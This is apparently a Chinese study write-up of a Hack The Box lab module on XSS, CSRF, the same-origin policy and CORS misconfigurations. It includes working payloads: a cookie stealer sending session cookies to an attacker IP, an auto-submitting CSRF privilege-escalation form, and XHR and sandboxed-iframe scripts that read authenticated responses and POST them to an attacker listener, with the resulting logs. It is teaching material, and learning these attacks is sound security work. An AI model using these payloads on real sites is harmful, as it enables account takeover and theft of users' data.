<ul><li>一个漏洞利用开发服务器<code>https://exploitserver.htb</code></li><li>我们正在评估给定虚拟主机上存在漏洞的Web应用程序。例如：<code>https://vulnerablesite.htb</code></li><li>此外，我们将在自己的系统上托管一个 HTTPS 网络服务器，以便我们能够泄露数据。</li></ul>
<p><strong>漏洞利用开发服务器</strong></p>
<p>我们可以使用漏洞开发服务器来<code>exploitserver.htb</code>开发 CSRF 或 XSS 有效载荷，并将漏洞利用程序传递给受害者。 漏洞利用开发服务器使我们能够开发针对目标 Web 应用程序中发现的特定漏洞的自定义漏洞利用程序。假设，对于目标 Web 应用程序中的 XSS 概念验证，我们希望触发一个警告框：</p>
<img alt="Pasted image 20260415041746" src="assets/posts/advanced-xss-csrf/Pasted image 20260415041746.png"/>
<p>我们可以通过访问该端点来查看我们开发的漏洞利用程序<code>/exploit</code>。这样做会触发警报弹出窗口：</p>
<img alt="Pasted image 20260415041800" src="assets/posts/advanced-xss-csrf/Pasted image 20260415041800.png"/>
<p>最后，我们可以通过访问目标端点将漏洞利用程序传递给受害者<code>/deliver</code>，这将导致受害者通过访问目标地址来触发我们开发的攻击载荷<code>https://exploitserver.htb/exploit</code>。这在 CSRF 攻击中非常有用，因为受害者必须主动访问攻击载荷才能触发漏洞利用代码。本模块侧重于漏洞利用程序的开发，而非漏洞利用程序的传递方法。将攻击载荷传递给受害者会强制触发漏洞利用程序。在现实世界中，存在多种漏洞利用程序传递方法，包括通过电子邮件或任何即时通讯服务向受害者发送链接。</p>
<p>我们还可以利用漏洞利用服务器来开发 XSS 攻击载荷。但是，在这种情况下，我们无需将漏洞利用程序直接传递给受害者，因为攻击载荷会通过注入到易受攻击站点上的 XSS 攻击载荷进行传播。</p>
<p><strong>HTTPS数据泄漏服务器</strong> 在本模块中，所有实验均运行在启用 HTTPS 的 Web 服务器上。现代 Web 浏览器实施了安全措施，防止 HTTPS 网站通过未加密的 HTTP 连接加载资源。为避免出现问题，我们将使用 Python 设置一个接受 HTTPS 请求的 Web 服务器。首先，我们需要为服务器生成一个新的自签名证书以支持加密通信。我们可以使用以下命令完成此操作。证书的详细信息可以任意指定：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes</code></pre>
<p>接下来，我们可以创建一个简单的 Python HTTPS 服务器，将传入的请求记录到标准输出（stdout）并保存到文件中<code>server.py</code>。我们需要为传入的<code>OPTIONS</code>请求配置 CORS，以便允许 JavaScript 请求体发出 POST 请求：</p>
<pre><code class="language-python">from http import server
import ssl

class CustomRequestHandler(server.SimpleHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        super().do_GET()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)

        if body:
            self.log_message("[i] POST body: %s", body.decode("utf-8", errors="replace"))

        self.send_response(200)
        self.end_headers()

print("Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...")
httpd = server.HTTPServer(('0.0.0.0', 4443), CustomRequestHandler)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='./server.pem')
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()</code></pre>
<p>之后，我们可以通过执行该文件来运行服务器<code>server.py</code>。为了测试服务器，让我们<code>curl</code>在第二个终端中快速发送一个测试请求：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ curl -vk https://127.0.0.1:4443/get?Hello=World
Chenduoduo@htb[/htb]$ curl -vk https://127.0.0.1:4443/post?Hello=World -d 'test=123'</code></pre>
<p>我们可以看到，请求 URL、所有 GET 参数和所有 POST 参数都打印在 Web 服务器运行的终端中。就本模块的目的而言，这足以满足数据泄露的需求：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
127.0.0.1 - - [30/Nov/2025 11:18:12] code 404, message File not found
127.0.0.1 - - [30/Nov/2025 11:18:12] "GET /get?Hello=World HTTP/1.1" 404 -
127.0.0.1 - - [30/Nov/2025 11:18:29] [i] POST body: test=123
127.0.0.1 - - [30/Nov/2025 11:18:29] "POST /post?Hello=World HTTP/1.1" 200 -</code></pre>
<p>虽然本模块所有实验环境均已禁用证书验证，但在实际应用中仍应避免使用自签名证书，因为现代浏览器可能会因 HTTPS 配置不当而拒绝通过不安全连接加载资源。有关 HTTPS 的更多详细信息，请参阅“HTTPS/TLS 攻击”模块。</p>
<pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>之后，我们可以在攻击服务器上创建一个 cookie 窃取有效载荷，例如以下代码。为了窃取 cookie，我们可以使用系统上运行的 HTTPS 服务器：</p>
<pre><code class="language-js">windows.location = "https://10.10.14.45:4443/cookiestealer?=" + document.cookie;</code></pre>
<p>保存漏洞利用程序后，我们可以通过访问端点来确认程序是否已保存<code>/exploit</code>：</p>
<img alt="Pasted image 20260415043149" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043149.png"/>
<p>最后，我们必须等待管理员用户访问留言簿。注入的 XSS 有效载荷会导致管理员的浏览器从攻击服务器加载有效载荷，从而将管理员用户的 cookie 泄露到我们的系统中：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py 

10.129.233.62 - - [31/Dec/2024 13:37:36] code 404, message File not found
10.129.233.62 - - [31/Dec/2024 13:37:36] "GET /cookiestealer?c=PHPSESSID=tiitsevk7pns4kmrcmjecm9qq6 HTTP/1.1" 404</code></pre>
<p><strong>CSRF</strong></p>
<img alt="Pasted image 20260415043309" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043309.png"/>
<p>然而，我们可以看到我们只有<code>user</code>这些权限。这里有一个<code>promote</code>按钮。如果我们点击它，Web 应用程序会提示我们只有管理员用户才能提升其他用户。但是，我们可以看到提升操作是通过以下请求实现的：</p>
<img alt="Pasted image 20260415043318" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043318.png"/>
<p>具体来说，这个端点缺少 CSRF 保护，这使得我们可以发起 CSRF 攻击，强制管理员提升我们用户的权限。为此，我们需要创建一个与提升请求对应的 HTML 表单：</p>
<pre><code class="language-html">&lt;html&gt;
  &lt;body&gt;
    &lt;form method="GET" action="https://csrf.labintro.htb/profile.php"&gt;
      &lt;input type="hidden" name="promote" value="htb-stdnt" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>由于我们不希望攻击需要额外的用户交互，我们将添加 JavaScript 代码，以便在页面加载完成后自动提交表单：</p>
<pre><code class="language-html">&lt;script&gt;     
	document.forms[0].submit(); 
&lt;/script&gt;</code></pre>
<p>将这两部分结合起来，会得到以下有效载荷，我们将把它保存在漏洞利用服务器中：</p>
<pre><code class="language-html">&lt;html&gt;
  &lt;body&gt;
    &lt;form method="GET" action="https://csrf.labintro.htb/profile.php"&gt;
      &lt;input type="hidden" name="promote" value="htb-stdnt" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p><code>View Exploit</code>我们可以通过登录到存在漏洞的应用程序后点击某个链接来测试我们的漏洞利用。这将向某个服务器发送请求<code>https://exploitserver.htb/exploit</code>，该服务器会返回我们保存的有效载荷。该有效载荷会自动提交表单，从而向存在漏洞的 Web 应用程序发起跨域请求。但是，由于我们不是管理员，因此权限提升失败：</p>
<img alt="Pasted image 20260415043428" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043428.png"/>
<p>然而，这证实了我们的 CSRF 有效载荷已成功发送 HTTP 请求以提升用户权限。要执行攻击，我们可以将有效载荷传递给受害者并选择当前的虚拟主机<code>csrf.labintro.htb</code>。这将导致受害者访问某个页面<code>https://exploitserver.htb/exploit</code>。等待几秒钟并刷新页面后，我们就会获得管理员权限：</p>
<img alt="Pasted image 20260415043442" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043442.png"/>
<h2>同源策略与 CORS</h2>
<h3>同源策略</h3>
<p>同源策略是一种在网页浏览器中实现的安全机制，旨在防止网站的跨源访问。特别是，运行在一个源节点上的 JavaScript 代码无法访问另一个源节点。这防止恶意网站从其他来源窃取信息，并限制其向其他来源发送的请求类型。</p>
<p><code>origin</code>定义为URL的<code>scheme</code>, <code>host</code>, and <code>port</code>. 只要两个URL在这三个属性中至少有一个不同, 就不是同源.</p>
<p>两个 URL <strong>同源（same origin）</strong> 必须满足三点完全相同：</p>
<div class="post-table-wrap"><table><thead><tr><th>项目</th><th>必须相同</th></tr></thead><tbody><tr><td>协议（Protocol）</td><td>http / https</td></tr><tr><td>域名（Host）</td><td>example.com</td></tr><tr><td>端口（Port）</td><td>80 / 443</td></tr></tbody></table></div>
<p>鉴于浏览器实施了同源策略，其软件中的漏洞和漏洞可能导致绕过，从而可能引发高严重的安全漏洞。</p>
<p><strong>没有同源策略</strong></p>
<p>假设在访问我们私人笔记本电脑 <code>https://exploitationserver.htb</code> 的恶意网站时，它执行了以下 JavaScript 代码：</p>
<pre><code class="language-html">&lt;script&gt;
    async function exfiltrate_data(url) {
        // get data
        const response = await fetch(url, {credentials: "include"});
        const data = await response.text();

        // exfiltrate data
        await fetch("https://attacker_system.htb/exfiltrate?c=" + btoa(data));
    }

    // exfiltrate mails
    exfiltrate_data("https://mymails.htb/getmails");

    // exfiltrate bank data
    exfiltrate_data("https://mybank.htb/myaccounts");

    // exfiltrate internal service
    exfiltrate_data("https://192.168.178.5/");
&lt;/script&gt;</code></pre>
<p><code>https://exploitationserver.htb</code> 上的 JavaScript 代码向我们的浏览器发出三次取 <code>https://mymails.htb/getmails</code>、<code>https://mybank.htb/myaccounts</code> 和 <code>https://192.168.178.5/</code> 的取用请求。如果我们登录了这些网站中的任意一个，浏览器可能会根据 <code>SameSite</code> cookie 配置的设置发送会话 Cookie，从而使这些请求获得认证。JavaScript 代码随后通过将响应发送回攻击者控制的系统 <code>https：//attacker_system.htb/exfiltrate</code> 来泄露。这样，运行 <code>https：//attacker_system.htb</code> 的攻击者就能从我们的用户账户获取对三次认证 GET 请求的响应，从而访问我们的 <code>https://mymails.htb</code> 邮箱、银行信息和账户余额 <code>https://mybank.htb</code>，甚至访问我们家内部 <code>https://192.168.178.5</code> 网络中的维基（该维基不公开，只能通过局域网访问）。</p>
<p>这是严重的安全违规，我们无力阻止其发生。同源政策专门设计来缓解这一问题。</p>
<p><strong>采用了同源策略</strong></p>
<p>如上所述，同源政策阻止了跨原点的访问。在上述案例中，由于主机不同，恶意网站攻击的 <code>https://exploitationserver.htb</code> 来源与所有三种来源不同。因此，调用不同源的<code>fetch</code>会在浏览器中引发由同源策略导致的错误，<code>https://exploitationserver.htb</code> 无法访问和窃取数据：</p>
<img alt="Pasted image 20260415054310" src="assets/posts/advanced-xss-csrf/Pasted image 20260415054310.png"/>
<p>理解同源策略阻止 <a href="https://exploitationserver.htb/" rel="noreferrer" target="_blank">https://exploitationserver.htb</a> 访问跨源请求的响应至关重要。（可能已认证的）请求本身仍然会被发送。我们可以在《Burp》中证实这一点。请注意 <code>Origin</code> 和 <code>Referer</code> 头，表明这确实是一个跨起源请求：理解同源策略阻止 <a href="https://exploitationserver.htb/" rel="noreferrer" target="_blank">https://exploitationserver.htb</a> 访问跨源请求的响应至关重要。（可能已认证的）请求本身仍然会被发送。我们可以在《Burp》中证实这一点。请注意 <code>Origin</code> 和 <code>Referer</code> 头，表明这确实是一个跨起源请求：</p>
<img alt="Pasted image 20260415054341" src="assets/posts/advanced-xss-csrf/Pasted image 20260415054341.png"/>
<p>这种行为可能导致 CSRF 攻击，因为请求不会被保留。</p>
<p>同源政策有一些例外情况。例如，我们可以在起源间加入诸如 <code>img</code>、 <code>视频</code>和<code>脚本</code>标签等资源。例如，尽管它被加载为跨来源，我们仍然可以使用以下 HTML 代码在我们拥有的网站上加入 Hack The Box Academy 的标志：</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;body&gt;
        &lt;script&gt;
            var img = document.createElement("img");
            img.setAttribute("src", "https://academy.hackthebox.com/images/logo.svg");
            document.body.appendChild(img);
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;</code></pre>
<h3>CORS 跨源资源共享</h3>
<p>跨原点资源共享（CORS）是 W3C 的一个标准，定义了同源政策的例外情况。它使源区能够定义可信源区和允许跨区访问的 HTTP 方法列表。</p>
<p>为了理解为什么需要 CORS，我们假设现实中常见的场景：一个托管在 <code>http://vulnerablesite.htb</code> 上的网页应用显示数据。为此，它与托管在 <code>http://api.vulnerablesite.htb</code> 上的 API 通信。更具体地说，运行<code>在 http://vulnerablesite.htb</code> 上的应用程序仅包含前端代码，负责从 API 获取数据。该 API 实现了一个简单的 REST API，由用于创建、读取、更新和删除数据的端点组成。</p>
<p>这使得前端网页应用变得简单，无需处理数据相关的逻辑。特别是，前端代码处理与 API 的交互，可以使用类似以下的 JavaScript 代码，因此所有数据在网站加载后都会被获取：</p>
<pre><code class="language-javascript">// fetch data
fetch("http://api.vulnerablesite.htb/data", {
    method: "GET"
}).then((response) =&gt; {
    return response.json();
}).then((data) =&gt; {
    // add to DOM
    &lt;SNIP&gt;
})
</code></pre>
<p>然而，如上所述，这违反了同源政策，因为 <code>http://vulnerablesite.htb</code> 和 <code>http://api.vulnerablesite.htb</code> 是不同的来源。因此，上述 JavaScript 代码会导致错误，数据未正确加载：</p>
<img alt="Pasted image 20260415055130" src="assets/posts/advanced-xss-csrf/Pasted image 20260415055130.png"/>
<p>现在，让我们讨论一下 CORS 的工作原理，以及网页应用如何与 API 通信而不被同源策略错误。</p>
<p><strong>CORS是如何运转的</strong></p>
<p>服务器可以通过 CORS 在 HTTP 响应中设置以下任一 CORS 头部来配置同源策略的异常</p>
<p>如果服务器还想让 JS 读其他响应头，就要用这个字段显式暴露出来。</p>
<p>也就是说，在这段时间内，浏览器不用每次都重新发 OPTIONS 预检。</p>
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin" rel="noreferrer" target="_blank">Access-Control-Allow-Origin</a>: 允许哪个源（Origin）来读取当前响应</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers" rel="noreferrer" target="_blank">Access-Control-Expose-Headers</a>: 默认情况下，前端 JS 在跨域响应里 <strong>只能读取少数“简单响应头”</strong>。</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Methods" rel="noreferrer" target="_blank">Access-Control-Allow-Methods</a>: 这个头主要用于 <strong>预检请求（preflight request）</strong> 的响应中，告诉浏览器： 这个跨域资源允许使用哪些 HTTP 方法</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers" rel="noreferrer" target="_blank">Access-Control-Allow-Headers</a>: 这个头也是用于 <strong>预检响应</strong>，告诉浏览器：前端跨域请求里，允许带哪些请求头</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials" rel="noreferrer" target="_blank">Access-Control-Allow-Credentials</a>: 是否允许跨域请求携带凭证，并且让前端 JS 读取响应</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Max-Age" rel="noreferrer" target="_blank">Access-Control-Max-Age</a>: 它告诉浏览器： 这次预检请求的结果，可以缓存多久</li></ul>
<div class="post-table-wrap"><table><thead><tr><th>头部</th><th>作用</th></tr></thead><tbody><tr><td><code>Access-Control-Allow-Origin</code></td><td>允许哪个源读取响应</td></tr><tr><td><code>Access-Control-Expose-Headers</code></td><td>允许前端额外读取哪些响应头</td></tr><tr><td><code>Access-Control-Allow-Methods</code></td><td>允许跨域使用哪些 HTTP 方法</td></tr><tr><td><code>Access-Control-Allow-Headers</code></td><td>允许跨域请求带哪些请求头</td></tr><tr><td><code>Access-Control-Allow-Credentials</code></td><td>是否允许带 cookie / Authorization 等凭证并读取响应</td></tr><tr><td><code>Access-Control-Max-Age</code></td><td>预检结果缓存多久</td></tr></tbody></table></div>
<p><strong>Preflight Requests</strong></p>
<p>所有不属于<code>简单请求</code>条件的请求称为<code>预检请求</code> 。在发送这些交叉起源请求之前，浏览器会向不同的起源发送包含实际交叉起源请求所有参数的<code>预检请求</code> 。这使得网络服务器能够决定是否允许跨源请求。浏览器等待对预检请求的响应，只有在网页服务器通过设置相应的 CORS 头来响应预检请求时，才会继续发送实际的交叉起始请求。由于浏览器在发送实际的跨源请求前会向网页服务器请求许可，因此无法在预检请求中出现 CSRF 漏洞。</p>
<p>预检检查请求是一个包含以下头部的 <code>OPTIONS</code> 请求：</p>
<p>访问-控制-请求-方法 ：告知服务器实际请求中使用的 HTTP 方法。</p>
<p>访问-控制-请求-头部 ：告知服务器实际请求中使用的 HTTP 头部</p>
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Method" rel="noreferrer" target="_blank">Access-Control-Request-Method</a>: inform the server about the HTTP method used in the actual request</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Headers" rel="noreferrer" target="_blank">Access-Control-Request-Headers</a>: inform the server about the HTTP headers used in the actual request</li></ul>
<p>例如，如果 API 需要接受来自 Web 应用的 POST 请求中的 JSON 数据，简单请求是不够的，因为 Content-Type 设置为 <code>application/json</code>，而简单请求中不允许这样做。因此，浏览器会先发送一次预检请求，再发送实际请求。API 需要相应地设置 CORS 响应头部，以通知浏览器允许跨源请求。更具体地说，必须允许原始 <code>http://vulnerablesite.htb</code>、<code>POST</code> 方法和头部 <code>Content-Type</code>。</p>
<p>正确配置 CORS 头部后，Web 应用和 API 可以互通，避免同源策略问题。假设用户想通过 POST 请求创建一个新的数据项;用户浏览器首先会发送一个检查前检查请求，以检查 API 是否允许可能存在危险的交叉起源请求：</p>
<img alt="Pasted image 20260415064528" src="assets/posts/advanced-xss-csrf/Pasted image 20260415064528.png"/>
<p>由于响应包含正确的 CORS 头部，浏览器知道 API 允许预检请求;因此，它继续发送：</p>
<img alt="Pasted image 20260415064539" src="assets/posts/advanced-xss-csrf/Pasted image 20260415064539.png"/>
<p>由于该请求还包含带有请求起点的 CORS 头部，浏览器会在同源策略中添加异常，允许网页应用访问响应（此例为<code>成功</code>响应）。</p>
<p>要启用用于更新数据的 <code>PUT</code> 请求和用于删除数据的 <code>DELETE</code> 请求，API 必须在对预检请求的响应中调整 <code>Access-Control-Allow-Methods</code> 的 CORS 头部，以包含所有允许的方法。</p>
<p>只要请求 <strong>不是简单请求</strong>（比如用 JSON、PUT、DELETE、自定义头），浏览器就会先发一个：</p>
<ol><li>什么是预检请求</li></ol>
<pre><code>OPTIONS 请求</code></pre>
<p>👉 这个就是预检请求</p>
<p>浏览器先问服务器：</p>
<ol><li>预检请求在问什么</li></ol>
<pre><code>我要跨域请求，可以吗？  
我要用 POST/PUT，可以吗？  
我要带 Content-Type / 自定义 header，可以吗？</code></pre>
<p>对应请求头：</p>
<pre><code>Access-Control-Request-Method  
Access-Control-Request-Headers</code></pre>
<ol><li>服务器怎么回应</li></ol>
<p>服务器如果允许，会返回：</p>
<pre><code>Access-Control-Allow-Origin  
Access-Control-Allow-Methods  
Access-Control-Allow-Headers</code></pre>
<p>👉 相当于说：</p>
<pre><code>可以，你可以这样请求</code></pre>
<h2>错误配置</h2>
<p>在深入探讨 CORS 配置错误之前，先讨论 CORS 配置错误可能带来的攻击途径。大多数攻击要求将<code>访问-控制-允许-凭证</code>头 设置为 <code>true</code>，从而在受害者的上下文中获得认证请求。如果 CORS 配置错误导致攻击者控制的域获得了同源策略的例外，那么由此产生的漏洞类似于 CSRF 漏洞，但更为严重。同源策略的例外允许攻击者控制的域访问交叉起源请求的响应。由于请求来自认证上下文，响应包含攻击者可能访问和窃取的敏感信息。此外，根据具体的 CORS 配置，攻击者可能与网络应用交互，冒充受害者并代其执行操作。</p>
<p>如果未设置访问<code>控制允许凭证（Access-Control-Allow-Credentials</code> ）首部，攻击者将无法继续实施这些攻击。然而，内部网页应用中的 CORS 配置错误可能使攻击者窃取不公开的信息。</p>
<blockquote><strong>注：</strong> 成功利用以下部分 CORS 错误配置，可能需要在现实世界网络应用中的会话 cookie 上设置 <code>SameSite=None</code> 属性。</blockquote>
<h3>任意 Origin 反射</h3>
<p>The <code>Access-Control-Allow-Origin</code> 头包含源头，允许绕过同源策略，因此浏览器允许源节点访问响应。此外，头部可以设置为通配符（<code>*</code>），这会导致所有起点获得同源策略绕过。但出于安全原因，该功能不能与<code>Access-Control-Allow-Credentials: true</code>真头合并，即通配符只能在没有凭证的情况下使用。</p>
<blockquote><strong>注：</strong> 原站和通配符的组合，比如 <code>https：//*.cors-misconfigs.htb</code>，是无效的。</blockquote>
<p>然而，一些网页应用需要允许多个来源的凭证。例如，想象一个运行<code>在 https://cors-misconfigs.htb</code> 的网页应用需要认证，并且被多个域（如 <code>https://site1.cors-misconfigs.htb</code> 和 <code>https://site2.cors-misconfigs.htb</code>）使用。为了实现这一点，网页应用可能会读取请求的 <code>Origin</code> 头，并在响应中的 <code>Access-Control-Allow-Origin</code> 头中反映出来。这实际上导致了与通配符起源与<code>Access-Control-Allow-Credentials: true</code> 头部结合的情景相同，但 CORS 标准并未明确阻止。</p>
<p>为了识别反映任意起点的 CORS 错误配置，我们需要查找网页应用将<code>访问-控制-允许-起点（Access-Control-Allow-Origin</code>）头设置为原<code>点</code>头中接收值的实例。然后我们可以将相应请求发送给 Burp Repeater，并将 Origin 头修改为虚假值，比如 <code>thisdoesnnotexist.whatever.htb</code>，并检查该域是否包含在 <code>Access-Control-Allow-Origin</code> 响应头中。如果是，网页应用就会遇到这种 CORS 配置错误。</p>
<p>① 攻击者网站：</p>
<pre><code>evil.com</code></pre>
<p>② 发请求：</p>
<pre><code>Origin: http://evil.com  
Cookie: 你的登录cookie</code></pre>
<p>③ 服务器错误配置（关键）</p>
<pre><code>Access-Control-Allow-Origin: http://evil.com  
Access-Control-Allow-Credentials: true</code></pre>
<p>④ 浏览器行为（核心）</p>
<pre><code>浏览器看到：服务器允许 evil.com 读取数据  
→ 不再拦截</code></pre>
<p>⑤ 结果</p>
<pre><code>evil.com 的 JS 可以拿到响应内容</code></pre>
<p>核心区别（必须死记）</p>
<pre><code>正常：能发请求，但读不到数据  
漏洞：能发请求，而且能读到数据</code></pre>
<p>再补一个关键点（很多人忽略） 必须同时有：</p>
<pre><code>Access-Control-Allow-Credentials: true</code></pre>
<p>否则：</p>
<pre><code>不会带 cookie → 拿不到用户数据 → 漏洞价值很低</code></pre>
<p><strong>Exploitation</strong> 为了利用这一点，攻击者可以在其网页服务器上托管类似的有效载荷，且起点为任意，例如 <code>https://exploitserver.htb/exploit</code>：</p>
<pre><code class="language-html">&lt;script&gt;
    var xhr = new XMLHttpRequest();
    # 1. 带上受害者 cookie  
	# 2. 发送跨域请求
    xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
    xhr.withCredentials = true;
    
    xhr.onload = () =&gt; {
        var exfil = new XMLHttpRequest();
        # JS 把数据发给攻击者服务器
        exfil.open('POST', 'https://10.10.14.45:4443/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        # 浏览器允许 JS 读取数据（核心）
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
&lt;/script&gt;</code></pre>
<p>假设受害者在 <code>https://exploitserver.htb/exploit</code> 导航到有效载荷，而浏览器在 <code>https://cors-misconfigs.htb</code> 存储了对错误配置的网页应用的有效凭证。在这种情况下，由于不安全的 CORS 配置，数据被从受害者的有效会话中访问并被窃取给攻击者。</p>
<p>访问托管有效载荷的网站后，受害者的浏览器会向 <code>https://cors-misconfigs.htb/data.php</code> 发送交叉源请求，并附带凭证，即会话 Cookie：</p>
<img alt="Pasted image 20260415070804" src="assets/posts/advanced-xss-csrf/Pasted image 20260415070804.png"/>
<p>由于响应在 CORS 头部反映了来源并允许凭证，攻击者的起源 <code>https://exploitserver.htb</code> 会被授予同源策略的例外。因此，有效载荷代码被允许访问响应并通过发送到攻击者的 HTTPS 泄露服务器来将其泄露：</p>
<pre><code>Chenduoduo@htb[/htb]$ python3 server.py 

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
10.10.14.144 - - [30/Nov/2025 12:04:04] "OPTIONS /log HTTP/1.1" 200 -
10.10.14.144 - - [30/Nov/2025 12:04:04] [i] POST body: {"data":"CjxodG1sPgo8aGVhZD5IZWxsbyBXb3JsZCE8L2hlYWQ+Cjxib2R5PjxkaXYgaWQ9InNlY3JldCI+VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdlLjwvZGl2PjwvYm9keT4KPC9odG1sPgo="}
10.10.14.144 - - [30/Nov/2025 12:04:04] "POST /log HTTP/1.1" 200 -</code></pre>
<p>在对被窃取的数据进行 base64 解码后，我们得到 HTML 页面：</p>
<pre><code class="language-shellsession">Chenduoduo@htb[/htb]$ echo -n CjxodG1sPgo8aGVhZD5IZWxsbyBXb3JsZCE8L2hlYWQ+Cjxib2R5PjxkaXYgaWQ9InNlY3JldCI+VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdlLjwvZGl2PjwvYm9keT4KPC9odG1sPgo= | base64 -d

&lt;html&gt;
&lt;head&gt;Hello World!&lt;/head&gt;
&lt;body&gt;&lt;div id="secret"&gt;This is a secret message.&lt;/div&gt;&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>因此，这种 CORS 错误配置使得没有有效凭证的攻击者能够访问 API 中的数据，尽管 API 有认证保护。</p>
<p>也就是说, 攻击者通过自己恶意网站上的payload, 诱导受害者自己去访问目标网站, 然后把目标网站的内容或数据再发送到恶意网站.</p>
<h3>不当来源白名单</h3>
<p><strong>Background  背景</strong></p>
<p>网页应用必须在反映来源白名单上对照可信来源，而不是反映任意的起源。如果检查不当，攻击者可能会绕过它，实现对不可信来源的同源例外。特别是，检查起源前缀或后缀的实现可能存在漏洞。</p>
<p>网络应用的一个常见目标是信任某一来源的所有子域名。例如，假设托管在 <code>https://cors-misconfigs.htb</code> 的 API 通过检查来源头部是否以字符串 <code>cors-misconfigs.htb</code> 结尾来验证来源头部，以验证只有兄弟子域名被授予同源策略例外。虽然 API 在信任来源前会对其进行检查，但该检查实现不当，因为它不仅覆盖<code>了 cors-misconfigs.htb</code> 的子域名，还涵盖了所有以 <code>cors-misconfigs.htb</code> 结尾的域名。</p>
<p><strong>Exploitation</strong> 利用这种 CORS 错误配置与利用任意原点反射（RNR）相同，攻击者可以使用相同的有效载荷来窃取数据。然而，由于检测了起点，攻击者对有效载荷的起点存在限制。由于后缀匹配，攻击者无法使用原 <code>https://exploitserver.htb</code> 进行利用，但可以选择任何以 <code>cors-misconfigs.htb</code> 结尾的原点，例如，<code>https://attackercors-misconfigs.htb</code> 作为载荷的托管。</p>
<h3>信任 null Origin</h3>
<p><code>Access-Control-Allow-Origin</code>头 不仅支持可信的起点和通配符，还支持表示<code>null origin</code>的值空。虽然实际中不应使用，但一些网络应用可能因误解其含义而实现。攻击者可以通过各种方法强制对交叉起始请求使用空起点，该请求随后被信任，从而产生同源策略异常。</p>
<p><strong>Exploitation</strong></p>
<p>攻击者必须在交叉起源请求中提供<code>null</code>源以利用该错误配置。任何origin都可以通过使用沙盒 iframe 实现：</p>
<pre><code class="language-html">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
    xhr.withCredentials = true;
    xhr.onload = () =&gt; {
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://10.10.14.144:4443/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<ul><li><code>sandbox="allow-scripts allow-top-navigation allow-forms</code>, 开启沙盒模式, 将iframe变为一个受限环境, 没有<code>allow-same-origin</code>, 浏览器会把这个iframe的origin设为<code>null</code>.</li></ul>
<p>使用该负载，利用方法与之前错误配置相同。然而，沙箱 iframe 导致交叉起源请求为<code>null</code> ：</p>
<img alt="Pasted image 20260415174331" src="assets/posts/advanced-xss-csrf/Pasted image 20260415174331.png"/>
<h3>针对本地网络</h3>
<p><strong>Background  背景</strong></p>
<p>即使网页应用未配置 CORS 允许凭证，攻击者仍可能针对在防火墙、反向代理或 NAT 后运行的本地网络中无法公开访问的网络应用。如果这些内部 Web 应用不要求认证，且包含信任攻击者来源的 CORS 错误配置，数据窃取可能成为可能。</p>
<p>如果不需要认证，也不需要访问 <code>Access-Control-Allow-Credentials</code> CORS 头。因此，除了迄今讨论的 CORS 错误配置外，万用字元起源还会导致这些情况下可被利用的错误配置。例如，假设一个不需要认证的内部 API 托管在 <code>https://172.16.0.2</code>。此外，API 在<code>Access-Control-Allow-Origin</code>设置通配符，因此信任所有起点。</p>
<p><strong>Exploitation</strong> API 唯一的保护是只能在内部网络内部访问;然而，万用卡起源允许任何攻击者控制的起源在受害者能够访问时窃取数据。由于无需认证，我们无需在 payload 中设置 <code>withCredentials</code> 选项：</p>
<pre><code class="language-html">&lt;script&gt;
